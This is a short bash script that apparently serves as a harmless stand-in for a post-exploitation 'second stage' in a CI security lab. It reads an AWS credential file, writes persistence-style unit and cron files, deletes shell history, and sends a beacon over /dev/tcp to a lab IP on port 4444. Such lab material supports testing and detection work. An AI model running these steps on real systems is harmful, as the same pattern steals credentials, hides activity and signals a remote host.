#!/bin/bash
# ROOTLINE lab "second stage" - a BENIGN stand-in, served only inside the CI runner
# (198.51.100.7 on a dummy interface). It mimics the *shape* of a post-exploitation
# step and nothing more, entirely inside the throwaway HOME set by run_chain.sh:
# reads a dummy credential file, writes a never-enabled unit file and a comment-only
# cron-style file, deletes a dummy shell history, and sends one line to a local listener.
set -eu
LAB_IP="${LAB_IP:-198.51.100.7}"
cat "$HOME/.aws/credentials" > /dev/null
mkdir -p "$HOME/.config/systemd/user" "$HOME/lab/cron.d"
printf '[Unit]\nDescription=rootline lab dummy unit (never enabled)\n' \
  > "$HOME/.config/systemd/user/rootline-lab.service"
printf '# rootline lab: comment only, never installed\n' > "$HOME/lab/cron.d/rootline-lab"
rm -f "$HOME/.bash_history"
exec 3<>"/dev/tcp/$LAB_IP/4444"
echo "rootline-lab beacon" >&3
exec 3>&-
curl -6 -s -o /dev/null "http://[::1]:4445/" || true
